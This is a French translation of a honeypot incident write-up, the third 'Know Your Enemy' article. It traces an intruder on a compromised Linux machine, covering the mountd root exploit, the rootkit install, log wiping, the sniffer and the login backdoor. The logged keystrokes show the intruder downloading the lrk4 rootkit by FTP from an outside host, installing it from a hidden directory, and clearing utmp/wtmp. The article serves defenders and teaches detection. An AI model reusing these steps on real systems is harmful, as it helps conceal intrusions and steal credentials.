@@ -1,0 +1,174 @@
+****************************************************
+Cet article a été traduit de l'anglais par OUAH (OUAH_hotmail.com), http://www.multimania.com/ouah. La version originale est de Lance Spitzner (lspitz@ksni.net) et peut-être obtenue à http://www.enteract.net/~lsiptz.  Pour tout commentaire, venez sur le channel de  hacking français : #root sur irc.kewl.org
+****************************************************
+
+Know Your Enemy III: Ils ont obtenu le statut root 
+
+Cet article est la troisième partie d'une série se concentrant sur le script kiddie.  Le premier article parlait de  la façon dont les script kiddies scannent, identifient, et exploitent des vulnérabilités.  Le deuxième article se concentre sur la façon dont vous pouvez détecter ces tentatives, identifier quels outils ils utilisent et quelles vulnérabilités ils recherchent. Cet article, le troisième, se concentre sur ce qui se produit une fois qu'ils obtiennent le statut root. Spécifiquement, comment ils cachent leurs traces et ce qu'ils font après.
+
+
+Qui est le script kiddie?
+
+Comme nous avons vu dans le premier article, le script kiddie n'est pas tant une personne, c'est plus une stratégie, la stratégie du scannage pour une intrusion facile. Il ne recherche pas une information ou une compagnie particulière, leur  but est d'obtenir le statut root de la manière la plus facile possible.  Les hackers font cela en se concentrant sur un petit nombre d'exploits et puis en recherchant les cibles sur l'entier du net pour tel exploit.  Il ne faut pas  sous-estimer cette stratégie, car tôt ou tard ils trouveront une machine vulnérable.
+
+Une fois qu'ils ont trouvé un système vulnérable et qu'ils ont obtenu le statut root, la première chose qu'ils font est d'assurer leurs arrières.  Ils veulent s'assurer que vous ne saurez pas que votre système a été hacké et que vous ne pourrez ni voir ni noter vos actions. Ensuite, ils emploient souvent votre système pour scaner d'autres réseaux ou surveiller silencieusement le vôtre. Pour avoir une meilleure compréhension de la façon dont les hackers arrivent à leurs fins,  nous allons suivre pas à pas les étapes de compromission d'un système par un hacker utilisant les techniques du script kiddie. Notre système, appelé mozart, est un ordinatueur Linux avec la Red Hat 5.1. Le système a été compromis le 27 avril 1999. Plus bas on a retranscrit les vrais techniques que notre hacker a utilisées, avec les logs du système et les frappes au clavier  pour vérifier chaque étape. Tous les logs du système ont été enregistrés sur un serveur protégé syslog, toutes les frappes ont été capturées avec la technique du sniffing.  Pour plus d'information sur la manière dont toutes ces informations ont peu être capturées, jetez un coup d'oeil sur "To Build a Honeypot". Dutant tout l'article nous dirons "il" pour le hacker bien que nous n'avons aucune idée si il s'agit d'un homme ou d'une femme.
+
+
+L'exploit
+
+Le 27 avril à 00:13, notre réseau a été scanné par l'ordinateur 1Cust174.tnt2.long-branch.nj.da.uu.net pour plusieurs vulnérabilités dont le bug imap. Notre
+hacker est venu sans discrétion vu que chaque ordinateur de notre réseau a été scanné (pour plus d'information sur la détection et l'analyse des scans, allez voir le deuxième article de
+cette série).
+
+Apr 27 00:12:25 mozart imapd[939]: connect from 208.252.226.174 
+Apr 27 00:12:27 bach imapd[1190]: connect from 208.252.226.174 
+Apr 27 00:12:30 vivaldi imapd[1225]: connect from 208.252.226.174 
+
+Apparemment il a du trouvé quel qui lui plaisait puisqu'il est revenu à 06:52 et à 16:47 le
+même jour. Il a commencé avec un scannage plus complet mais cette fois se fixant seulement sur mozart.  Il identifia une vulnérabilité et lança une attaque qui fut couronnée de succès contre mountd, une vulnérabilité généralement connue pour la Red Hat 5.1.  Ici nous voyons dans 
+/var/log/messages le hacker qui obtient le statut de root. L'outil utilisé était certainement
+ADMmountd.c ou quelque chose du style.
+
+Apr 27 16:47:28 mozart mountd[306]: Unauthorized access by NFS client 208.252.226.174. 
+Apr 27 16:47:28 mozart syslogd: Cannot glue message parts together 
+Apr 27 16:47:28 mozart mountd[306]: Blocked attempt of 208.252.226.174 to mount 
+~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P 
+~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ 
+
+Juste après cette exploit, nous voyons dans / ar/log/messages le hacker devenir root en se telnetant comme l'user crack0 puis faisant un su à l'user rewt. Chacun de ces deux comptes ont été ajouté par l'exploit. Notre hacker a maintenant le contrôle total de notre système.
+
+Apr 27 16:50:27 mozart login[1233]: FAILED LOGIN 2 FROM
+1Cust102.tnt1.long-branch.nj.da.uu.net FOR crak, User not known to the underlying
+authentication module 
+Apr 27 16:50:38 mozart PAM_pwdb[1233]: (login) session opened for user crak0 by (uid=0) 
+Apr 27 16:50:38 mozart login[1233]: LOGIN ON ttyp0 BY crak0 FROM
+1Cust102.tnt1.long-branch.nj.da.uu.net 
+Apr 27 16:50:47 mozart PAM_pwdb[1247]: (su) session opened for user rewt by crak0(uid=0)
+
+
+Cacher ses traces
+
+Le hacker est maintenant root sur votre système. Comme nous allons le voir maintenant, la suite
+pour lui est de s'assurer de ne pas se faire attrapper. D'abord il regarde s'il y a quelqu'un d'autre sur l'ordinateur.
+
+[crak0@mozart /tmp]$ w 
+  4:48pm  up 1 day, 18:27,  1 user,  load average: 0.00, 0.00, 0.00 
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT 
+crak0    ttyp0    1Cust102.tnt1.lo  4:48pm  0.00s  0.23s  0.04s  w 
+
+Après s'être assurer qu'il n'y ait personne à l'horizon, il voudra cacher tout ce qu'il veut faire.
+
+Ceci nécessite normalement d'enlever n'importe quelle trace des fichiers logs et de remplacer les exécutables du système, par exemple pour ps et netstat, par des trojans système, pour que vous ne puissiez voir le hacker sur votre propre système. Une fois que les trojans ont été installés, le hacker a obtenu le contrôle total de votre système et vous ne le saurez probablement jamais. De même qu'il existe des scripts automatiques pour hacker, il y a aussi des outils automatisés pour cacher les hackers, souvent appelés rootkits. Un des rootkits les plus connus est lrk4. En exécutant le script, plusieurs fichiers importants sont remplacés ce qui a pour but de cacher le hacker après quelques secondes. Pour des informations plus détaillées sur les rootkits, regardez le fichier README qui accompagne lrk4. Cela vous donnera une meilleure idée de la façon dont les rootkits fonctionnent en général. Je vous recommande aussi de regarder "hide and seek", un document intéressant pour cacher ses traces.
+
+Quelques minutes après avoir compromis notre système, nous voyons le hacker downloader le rootkit et implémenter le script avec la commande "make install". Ci-dessous, les vrais frappes au clavier que le hacker a utilisé pour se cacher.
+
+cd /dev/ 
+su rewt 
+mkdir ". " 
+cd ". " 
+ftp technotronic.com 
+anonymous 
+fdfsfdsdfssd@aol.com 
+cd /unix/trojans 
+get lrk4.unshad.tar.gz 
+quit 
+ls 
+tar -zxvf lrk4.unshad.tar.gz 
+mv lrk4 proc 
+mv proc ". " 
+cd ". " 
+ls 
+make install 
+
+Remarquez que la première chose que notre hacker fit est de créer le répertoire caché ". " pour cacher son toolkit. Ce répertoire n'apparait pas  avec la commande "ls", et apparais comme le
+répertoire local avec la commande "ls -la". Une façon de localiser le répertoire  est d'utiliser
+la commande "find" (soyez sur que vous ayez en l'intégrité de votre exécutable "find").
+
+mozart #find / -depth -name "*.*" 
+/var/lib/news/.news.daily 
+/var/spool/at/.SEQ 
+/dev/. /. /procps-1.01/proc/.depend 
+/dev/. /. 
+/dev/. 
+
+Notre hackeur a été quelque peu laborieux en utilisant des trojans mais a eu une approche simpliste pour effacer les fichiers logs. Au lieu d'utiliser des outils de nettoyage comme zap2 ou clean, il a copié le fichier /dev/null sur les fichiers /var/run/utmp et /var/log/utmp tout en effaçant /var/log/wtmp. Vous savez peut-être que quelque chose ne joue pas quand  ces fichiers
+logs ne contiennent aucune donnée ou si vous obtenez l'erreur suivante:
+
+[root@mozart sbin]# last -10 
+last: /var/log/wtmp: No such file or directory 
+Perhaps this file was removed by the operator to prevent logging last info. 
+
+
+L'étape suivante
+
+Une fois qu'un système a été compromis, les hackers essayent de faire un de ces deux choses:
+Premièrement ils utilisent votre système comme plateforme de lancement en scannant ou en forçAnt d'autres systèmes. En second lieu, ils décident d'étendre leur prise en voyant ce qu'ils peuvent apprendre de votre système comme des comptes sur d'autres systèmes. Notre hacker opta pour la solution deux. Il implémenta un sniffer sur notre système qui capturerait tout le trafic de notre réseau y compris les sessions telnet et ftp sur d'autres systèmes. De cette façon il pourrait connaître les logins et les passwords. Nous pouvons voir notre système passer en promiscuous mode dans /var/log/messages peu après l'intrusion.
+
+ 
+Apr 27 17:03:38 mozart kernel: eth0: Setting promiscuous mode. 
+Apr 27 17:03:43 mozart kernel: eth0: Setting promiscuous mode. 
+
+Après avoir implémenté les trojans, nettoyé les logs et exécuté le sniffer notre hacker se
+déconnecta du système. Cependant, nous le verrons revenir le lendemain pour retirer les résultats de ses captures du trafic.
+
+
+Contrôle des dégâts
+
+Puisque notre ami s'est déconnecté, cela me donna une chance de passer en revue le système et de voir ce qui s'était exactement passé. J'étais extrêmement intéressé de voir ce qui avait été altéré et où il stockait les informations du sniffeur.  D'abord, j'identifiai rapidement avec tripwire quels fichiers avaient été modifié. Remarque: soyez sur de lancer tripwire depuis une source valide. J'aime lancer une version statically-linked de tripwire d'un lecteur en lecture seule. Tripwire montra les choses suivantes:
+
+added:   -rw-r--r-- root            5 Apr 27 17:01:16 1999 /usr/sbin/sniff.pid 
+added:   -rw-r--r-- root          272 Apr 27 17:18:09 1999 /usr/sbin/tcp.log 
+changed: -rws--x--x root        15588 Jun  1 05:49:22 1998 /bin/login 
+changed: drwxr-xr-x root        20480 Apr 10 14:44:37 1999 /usr/bin 
+changed: -rwxr-xr-x root        52984 Jun 10 04:49:22 1998 /usr/bin/find 
+changed: -r-sr-sr-x root       126600 Apr 27 11:29:18 1998 /usr/bin/passwd 
+changed: -r-xr-xr-x root        47604 Jun  3 16:31:57 1998 /usr/bin/top 
+changed: -r-xr-xr-x root         9712 May  1 01:04:46 1998 /usr/bin/killall 
+changed: -rws--s--x root       116352 Jun  1 20:25:47 1998 /usr/bin/chfn 
+changed: -rws--s--x root       115828 Jun  1 20:25:47 1998 /usr/bin/chsh 
+changed: drwxr-xr-x root         4096 Apr 27 17:01:16 1999 /usr/sbin 
+changed: -rwxr-xr-x root       137820 Jun  5 09:35:06 1998 /usr/sbin/inetd 
+changed: -rwxr-xr-x root         7229 Nov 26 00:02:19 1998 /usr/sbin/rpc.nfsd 
+changed: -rwxr-xr-x root       170460 Apr 24 00:02:19 1998 /usr/sbin/in.rshd 
+changed: -rwxr-x--- root       235516 Apr  4 22:11:56 1999 /usr/sbin/syslogd 
+changed: -rwxr-xr-x root        14140 Jun 30 14:56:36 1998 /usr/sbin/tcpd 
+changed: drwxr-xr-x root         2048 Apr  4 16:52:55 1999 /sbin 
+changed: -rwxr-xr-x root        19840 Jul  9 17:56:10 1998 /sbin/ifconfig 
+changed: -rw-r--r-- root          649 Apr 27 16:59:54 1999 /etc/passwd 
+
+Comme vous pouvez le voir plusieurs exécutables et fichiers ont été modifié. Il n'y avait aucune nouvelle entrée dans /etc/passwd (il avait prudemment enlevé les comptes de crak0 et de rewt) donc notre hacker avait du laisser une backdoor dans un des exécutables modifiés.  En outre, deux fichiers avaient été ajoutés, /usr/sbin/sniff.pid et /usr/sbin/tcp.log. Sans surprise /usr/sbin/sniff.pid était le pid du sniffer et /usr/sbin/tcp.log était où il stockait toutes les informations capturées. Se basant sur /usr/sbin/sniff.pid, le sniffer s'est avéré être rpc.nfsd. Notre hacker avait compilé un sniffer, ici linsniffer, et remplaça rpc.nfsd par celui-ci. Cela lui assurait que si le système était rebooté, le sniffer redémarrait le processus d'initialisation. Les lignes suivantes confirment que rpc.nfsd est le sniffer:
+
+mozart #strings /usr/sbin/rpc.nfsd | tail -15 
+cant get SOCK_PACKET socket 
+cant get flags 
+cant set promiscuous mode 
+----- [CAPLEN Exceeded] 
+----- [Timed Out] 
+----- [RST] 
+----- [FIN] 
+%s => 
+%s [%d] 
+sniff.pid 
+eth0 
+tcp.log 
+cant open log 
+rm %s 
+
+Après avoir passé en revue le système et compris ce qui s'était passé, je quittai le système.
+J'étais curieux de savoir ce que ferait le hacker après. Je n'ai pas voulu qu'il sût que je l'avais attrapé, ainsi j'ai enlevé toutes mes entrées de /usr/sbin/tcp.log.
+
+
+Les suites du script kiddie
+
+Notre hacker revint le jour suivant. En sauvant ses frappes au clavier, je pus rapidement
+identifier la backdoor, /bin/login étais infectée par un trojan. Cet exécutable utilisé pour les connections telnet était configuré pour donner au compte "rewt" les privilèges root avec le mot de passe "satori". Le mot de passe "satori " est le mot de passe par défaut pour tous les exécutables trojaned  que le rootkit lrk4 utilise, une information radicale pour savoir si 
+votre système a été compromis.
+
+Le hacker vérifiait son sniffer pour s'assurer qu'il fonctionnait toujours. En outre, il voulait voir si un compte avait été capturé depuis la veille. Vous pouvez voir ses frappes au clavier sur "keystrokes.txt". Remarquez qu'à la fin du log notre hacker fit un kill sur le sniffer. Ce fut la dernière chose qu'il fit avant de finir sa session. Cependant, il revint rapidement après quelques minutes avec une autre session juste pour redémarrer le sniffer. Je ne sais pas vraiment pourquoi il fit cela.
+
+Cette histoire de vérification du système continua encore plusieurs jours. Chaque jour le hacker voulait se connecter au système  pour voir si le sniffer fonctionnait et s'il avait pris des données intéressantes. Après le quatrième jour, j'en eus assez et déconnectai le système. J'avais appris assez des actions du hackeur et n'allais rien apprendre de nouveau.
+
+
+Conclusion
+
+Nous avons vu dans cet article comment un hacker peut agir, du début à la fin, une fois qu'il est devenu root sur votre système. Ils commencent souvent par vérifier si quelqu'un est sur le système. Une fois qu'ils savent que la voie est libre, ils dissimulent leurs traces en nettoyant les fichiers logs et en remplaçant ou en modifiant des dossiers importants.  Une fois qu'ils sont cachés de manière sure, ils passent à de nouvelles et plus préjudiciables activités. Leur tactique est de rester, vu que les nouveaux exploits sont constamment découverts.  Pour mieux se protéger contre ces menaces, je vous recommande de sécuriser vos ordinateurs. Une sécurité de base vous protégera contre la menace de la plupart des script kiddies, contre le fait qu'ils forcent un système sans trop de problèmes. Pour se faire une idée sur la façon de sécuriser votre système, allez voir "Armoring Linux" ou "Armoring Solaris".  S' il est trop tard et que vous pensez que  votre système a  déjà été compromis, un bon départ est le site du CERT "Recovering from an Incident" .
